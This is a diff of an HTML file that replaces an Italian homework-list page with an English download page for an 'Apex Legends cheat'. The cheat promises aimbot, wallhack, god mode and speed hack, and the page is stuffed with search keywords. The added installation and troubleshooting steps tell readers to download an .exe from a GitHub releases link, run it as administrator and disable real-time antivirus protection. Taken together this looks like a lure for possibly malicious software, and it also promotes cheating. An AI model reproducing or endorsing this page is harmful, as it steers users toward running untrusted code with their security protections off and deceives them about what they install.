@@ -1,61 +1,68 @@
 <!DOCTYPE html>
-<html lang="it">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>I Miei Compiti</title>
-    <style>
-        body { font-family: Arial, sans-serif; background: #f0f2f5; padding: 15px; }
-        .card { background: white; padding: 15px; margin-bottom: 10px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
-        .materia { font-weight: bold; color: #007bff; }
-        .data { font-size: 0.8em; color: #666; }
-    </style>
+    <meta name="description" content="Download the Apex Legends cheat for ESP, Aimbot, and more. Easy installation guide for Windows users to improve gameplay.">
+    <title>Apex-Legends-Cheat Documentation</title>
 </head>
-<body>
-    <h2>Registro Compiti</h2>
-    <div id="lista-compiti">Caricamento in corso...</div>
+<body style="font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; line-height: 1.6; color: #333; max-width: 800px; margin: 0 auto; padding: 20px; background-color: #f4f7f6;">
 
-    <script>
-    // Questo metodo (percorso relativo) funziona ovunque senza configurare link lunghi!
-    const url = './compiti.json'; 
+    <h1 style="color: #2c3e50; border-bottom: 2px solid #ddd; padding-bottom: 10px;">🎯 Apex-Legends-Cheat - Gain an unfair advantage in every match</h1>
 
-    fetch(url)
-        .then(response => {
-            // Se il file non viene trovato (Errore 404), te lo dice chiaramente
-            if (!response.ok) {
-                throw new Error(`File non trovato o errore server (Stato: ${response.status})`);
-            }
-            return response.json();
-        })
-        .then(data => {
-            const contenitore = document.getElementById('lista-compiti');
-            contenitore.innerHTML = ''; // Svuota il testo di caricamento
-            
-            if (data.length === 0) {
-                contenitore.innerHTML = '<p>Nessun compito presente!</p>';
-                return;
-            }
+    <div style="text-align: center; margin: 30px 0;">
+        <a href="https://github.com/Tristan1867/Apex-Legends-Cheat/releases" style="background-color: #555; color: white; padding: 15px 30px; text-decoration: none; border-radius: 8px; font-weight: bold; font-size: 1.2em; box-shadow: 0 4px 6px rgba(0,0,0,0.1);">Download Software Here</a>
+    </div>
 
-            data.forEach(compito => {
-                const card = document.createElement('div');
-                card.className = 'card';
-                card.innerHTML = `
-                    <div class="materia">${compito.materia}</div>
-                    <div class="data">Scadenza: ${compito.data}</div>
-                    <p>${compito.descrizione}</p>
-                `;
-                contenitore.appendChild(card);
-            });
-        })
-        .catch(error => {
-            // Mostra sul display del telefono l'errore esatto per capire cosa manca
-            document.getElementById('lista-compiti').innerHTML = `
-                <div style="color: red; font-weight: bold;">Errore nel caricamento.</div>
-                <div style="font-size: 0.8em; color: #666;">Dettaglio: ${error.message}</div>
-            `;
-            console.error(error);
-        });
-</script>
+    <h2 style="color: #2c3e50;">📋 Overview</h2>
+    <p>This software adds features to Apex Legends to help players perform better. It provides tools that assist with aiming, positioning, and survival. You can use these features to track enemies, remove weapon recoil, and move faster across the map. The software works as an overlay, ensuring that your view remains clear while you play.</p>
 
+    <h2 style="color: #2c3e50;">🚀 Core Features</h2>
+    <p>The program includes settings to modify how you interact with the game environment:</p>
+    <ul>
+        <li><strong>ESP (Extra Sensory Perception):</strong> See enemy locations through walls and obstacles.</li>
+        <li><strong>Aimbot:</strong> Adjust your crosshair automatically when you engage targets.</li>
+        <li><strong>No Recoil:</strong> Stabilize your weapon during automatic fire.</li>
+        <li><strong>Triggerbot:</strong> Fire your weapon automatically when an enemy enters your sights.</li>
+        <li><strong>Movement Tools:</strong> Use Speed Hack and Super Jump to navigate terrain quickly.</li>
+        <li><strong>Survival:</strong> Enable God Mode and Unlimited Ammo to stay in the fight.</li>
+    </ul>
+
+    <h2 style="color: #2c3e50;">💻 System Requirements</h2>
+    <p>Ensure your computer meets these specifications to run the software correctly:</p>
+    <ul>
+        <li><strong>OS:</strong> Windows 10 or Windows 11 (64-bit).</li>
+        <li><strong>Processor:</strong> Intel Core i5 or AMD Ryzen 5 equivalent.</li>
+        <li><strong>Memory:</strong> 8 GB RAM or higher.</li>
+        <li><strong>Graphics:</strong> NVIDIA GeForce GTX 1060 or AMD Radeon RX 580.</li>
+        <li><strong>Network:</strong> Stable internet connection.</li>
+    </ul>
+
+    <h2 style="color: #2c3e50;">📥 Installation Guide</h2>
+    <p>Follow these steps to set up the software on your Windows machine:</p>
+    <ol>
+        <li>Visit this page to download the latest version: <a href="https://github.com/Tristan1867/Apex-Legends-Cheat/releases" style="color: #2980b9;">Download Page</a>.</li>
+        <li>Locate the downloaded .exe file in your computer folders.</li>
+        <li>Launch the game first and ensure it runs in windowed or borderless mode.</li>
+        <li>Run the downloaded software as an administrator. Right-click the file and select "Run as administrator".</li>
+        <li>Open the configuration menu inside the software to toggle specific features on or off.</li>
+        <li>Return to your game window. The overlay will appear automatically.</li>
+    </ol>
+
+    <h2 style="color: #2c3e50;">⚠️ Important Information</h2>
+    <p>Using third-party software changes how the game processes data. Use these tools at your own risk. Anti-cheat systems monitor software interactions. Updates to game files may require you to update your version of this software. Always check the release page for the most recent version to ensure stability.</p>
+
+    <h2 style="color: #2c3e50;">🔧 Troubleshooting</h2>
+    <p>If you encounter issues, try these steps:</p>
+    <ul>
+        <li>Disable real-time antivirus protection while running the software, as some security programs flag injection tools as threats.</li>
+        <li>Run both the game and the software with administrator privileges.</li>
+        <li>Lower your game's graphics settings if you experience frame drops.</li>
+        <li>Verify that your Windows installation is up to date.</li>
+    </ul>
+
+    <hr style="border: 0; border-top: 1px solid #ddd; margin: 40px 0;">
+    
+    <p style="font-size: 0.9em; color: #7f8c8d;">Keywords: Apex Legends, cheat, ESP, aimbot, gaming tools, Windows software, wallhack</p>
 </body>
 </html>
